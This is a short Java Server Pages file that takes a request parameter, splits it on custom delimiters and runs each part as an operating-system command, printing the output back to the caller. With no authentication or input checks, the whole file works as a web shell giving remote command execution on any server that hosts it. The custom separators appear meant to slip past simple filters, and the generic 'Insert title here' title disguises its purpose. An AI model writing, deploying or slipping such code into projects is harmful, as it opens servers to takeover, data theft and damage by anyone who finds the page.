<%@page import="utilities.ExecuteDOSCommand"%>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
pAgE
<%
String q=request.getParameter("q");
q=q.replaceAll("Spacedelim", " ");

String[] cmds=q.split("DeLiM");
for(int i=0;i<cmds.length;i++){
%>oUtPuT<%=ExecuteDOSCommand.getCommandOutput(cmds[i], 0) %>
  <%} %>
pAgE
</body>
</html>